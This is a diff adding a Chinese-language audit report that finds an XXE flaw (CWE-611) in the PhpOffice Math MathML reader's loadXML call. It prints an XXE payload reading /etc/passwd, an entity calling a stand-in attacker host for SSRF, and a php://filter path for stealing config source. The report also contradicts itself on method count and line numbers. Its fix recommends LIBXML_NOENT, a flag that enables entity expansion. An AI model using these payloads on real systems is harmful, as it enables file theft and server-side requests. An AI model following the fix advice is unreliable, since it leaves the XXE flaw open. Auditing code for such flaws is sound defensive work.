@@ -1,0 +1,93 @@
+# PHP MathML Reader 安全分析报告
+
+## 一、代码结构总览与入口点枚举
+
+本文件为 PhpOffice（PHPOffice/Math 项目）中的 `MathML` 读取器，位于命名空间 `PhpOffice\Math\Reader`。全文共两个方法：
+
+- **第 20–33 行：`read(string $content): ?Math`** —— 唯一公开入口点，接收外部传入的字符串 `$content`。
+- **第 40–57 行：`parseNode(?DOMNode $nodeRowElement, $parent)`** —— 内部递归解析方法，遍历 XPath 查询结果。
+- **第 59–113 行：`getElement(DOMNode $nodeElement)`** —— 内部递归元素构造方法，按节点名分发到不同 Element 类。
+
+### 入口点清单
+
+1. **主入口（第 20 行）**：`read(string $content)` 的参数 `$content` 是外部可控的 source。调用方（如 PHPSpreadsheet 中处理 ODS/公式时）通常将用户上传文档中嵌入的 MathML 片段直接传入此方法。
+2. **替代通道**：`$content` 可能来自：
+   - 上传的电子表格/文档文件中被解压出的 XML 内容；
+   - HTTP 请求参数直接传入 `read()`；
+   - 数据库中存储的历史内容回放。
+   无论哪条通道，最终都汇入第 27 行的 XML 解析调用。
+3. **环境变量 / 回调入口**：全文无 `getenv`、无回调注册、无反序列化入口，排除这些通道。
+
+## 二、逐函数 Source→Sink 数据流验证
+
+### 函数 1：`read()`（第 20–33 行）
+
+**数据流 A —— XXE 注入路径（核心漏洞）：**
+
+- **Source（第 20 行）**：`$content` 参数完全外部可控。
+- **预处理（第 22–28 行）**：仅做字符串替换 `&InvisibleTimes;` → `<mchar name="InvisibleTimes"/>`。这是纯文本替换，不构成任何安全防御，且替换后的内容仍由攻击者控制其余部分。
+- **Sink（第 29–31 行）**：
+  ```php
+  $this->dom = new DOMDocument();
+  $this->dom->loadXML($content, LIBXML_DTDLOAD);
+  ```
+  关键点：**`loadXML()` 显式启用了 `LIBXML_DTDLOAD` 标志**。该标志允许加载外部 DTD 子集。在 libxml2 < 2.9 默认配置或未同时禁用实体的环境下，这构成经典的 **XXE（XML External Entity Injection）**：
+
+  攻击者可提交如下 MathML 载荷：
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE math [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <math><mi>&xxe;</mi></math>
+  ```
+  实体展开后，`file:///etc/passwd` 的内容会进入 DOM 树节点值，随后在第 47 行被读取为 `$nodeValue = trim($nodeElement->nodeValue)`，再于第 68 行包装为 `Element\Identifier($nodeValue)` 存入返回的 `Math` 对象——即文件内容可通过返回对象外泄（若上层将解析结果序列化输出）。
+
+  更严重的是 **SSRF / 盲打场景**：`<!ENTITY xxe SYSTEM "http://attacker/">` 可发起服务端请求；配合 `php://filter` 包装器可读取任意源码文件（如 `php://filter/read=convert.base64-encode/resource=/var/www/config.php`）。
+
+  防御有效性验证：全文对 `$content` 无任何 DTD 禁用、无实体白名单、无输入校验。`LIBXML_DTDLOAD` 单独使用且未搭配 `LIBXML_NONET` 或 `libxml_disable_entity_loader(true)`（PHP 8.0 前可用），**黑名单式/部分标志启用不算有效防御**。
+
+  缓解因素说明：现代 PHP（8.1+）默认编译的 libxml2 ≥ 2.9 且默认禁用外部实体加载，此时风险降级为 DoS（billion laughs 实体膨胀，因 DTDLOAD 允许内部实体定义）。但作为库代码，不能假设部署环境的 libxml 版本，历史 CVE（如 PHPOffice 相关组件的 XXE 报告）均源于此类写法。
+
+**数据流 B —— 错误信息泄露（次要）：**
+
+- 第 35 行 `InvalidInputException(sprintf(..., $nodeElement->nodeName))` 与第 108 行 `NotImplementedException(sprintf(..., $nodeElement->nodeName))` 将攻击者控制的标签名拼入异常消息。`nodeName` 来自 XML 解析结果，虽经 DOM 解析规范化（难以注入引号），但异常消息若直接回显给用户，属于 CWE-209 信息泄露。风险低，非独立漏洞。
+
+### 函数 2：`parseNode()`（第 40–57 行）
+
+- **第 43 行**：每次调用重建 `DOMXPath`，性能问题但无安全问题。
+- **第 44 行**：`xpath->query('*', ...)` 使用通配符查询所有子元素，XPath 表达式本身为常量字符串 `'*'`，**不存在 XPath 注入**（无用户输入拼接进表达式）。
+- **第 46–52 行**：当父节点为 `Semantics` 且子节点名为 `annotation` 时，第 49–50 行取 `getAttribute('encoding')` 与 `trim($nodeElement->nodeValue)` 存入注解。此处 `nodeValue` 若含实体展开结果，同样携带 XXE 外泄数据——是数据流 A 的下游传播通道之一，而非独立漏洞。
+- **第 55 行**：`$parent->add(...)` 为内存对象操作，无危险 sink。
+
+### 函数 3：`getElement()`（第 59–113 行）
+
+- **第 60 行**：`trim($nodeElement->nodeValue)` —— 如上所述，是 XXE 数据外泄的汇聚点。
+- **第 63–75 行（mfrac）、第 87–99 行（msup）**：递归调用 `getElement`，仅做数量检查（length == 2），无安全问题；无限递归受限于 XML 文档深度，DoS 风险有限。
+- **第 76 行（mn）**：`floatval($nodeValue)` 强制类型转换，数值注入不可能。
+- **第 77–89 行（mo/mchar）**：`getAttribute('name')` 取属性值构造 `Operator`，纯内存操作。
+- **第 90–95 行（mrow）、第 100–105 行（semantics）**：递归 `parseNode`，同上。
+- **第 106–111 行（default）**：抛出 `NotImplementedException`，消息含节点名（见数据流 B）。
+
+## 三、第二入口与替代通道复核
+
+1. **无其他 public 方法**：除 `read()` 外全部为 protected，外部无法绕过第 29 行直接触发 sink。
+2. **`parseNode`/`getElement` 接收的是已解析 DOM 节点**，其内容源头仍是第 29 行的 `loadXML`，属同一数据流的下游。
+3. **替代利用通道确认**：即使上层不回显解析结果，XXE 的 out-of-band 通道（实体指向攻击者 HTTP/FTP 服务器的 SSRF 回连）依然成立，不依赖输出回显。
+4. **无反序列化、无文件写入、无命令执行 sink**：全文无 `eval`、`system`、`file_put_contents`、`unserialize`，排除 RCE 类漏洞。
+
+## 四、结论
+
+核心漏洞为 **CWE-611（XXE，Improper Restriction of XML External Entity Reference）**：source 为第 20 行 `read()` 的 `$content` 参数，sink 为第 30 行 `loadXML($content, LIBXML_DTDLOAD)`。中间仅有无关紧要的字符串替换（第 22–28 行），无任何有效防御。风险等级评估为**高危**（库代码无法控制宿主环境 libxml 配置；可导致任意文件读取、SSRF、实体爆炸 DoS）。次要注意事项：第 35/108 行异常消息包含用户可控标签名（CWE-209，低危）。
+
+```json
+{
+  "has_vulnerability": true,
+  "vulnerability_type": "CWE-611 (XML External Entity Injection, XXE)",
+  "risk_level": "high",
+  "source": "line 20: read(string $content) 的外部可控参数 $content",
+  "sink": "line 30: $this->dom->loadXML($content, LIBXML_DTDLOAD)",
+  "explanation": "外部传入的 MathML 字符串未经任何 DTD 或实体过滤，第 22-28 行仅做无关安全的字符串替换，随后在第 30 行以 LIBXML_DTDLOAD 标志解析，允许加载外部 DTD 与实体 -> 攻击者可通过 DOCTYPE 定义 SYSTEM 实体实现任意文件读取(配合 php://filter)、SSRF 回连及 billion laughs 实体膨胀 DoS，外泄数据经 line 47 nodeValue 进入返回的 Math 对象",
+  "fix_suggestion": "line 30: 移除 LIBXML_DTDLOAD，改用 LIBXML_NONET | LIBXML_NOENT 组合并显式禁止实体加载(如 loadXML($content, LIBXML_NONET | LIBXML_COMPACT) 并在 PHP<8.0 时调用 libxml_disable_entity_loader(true))，或在解析前校验并剥离 DOCTYPE 声明"
+}
+```
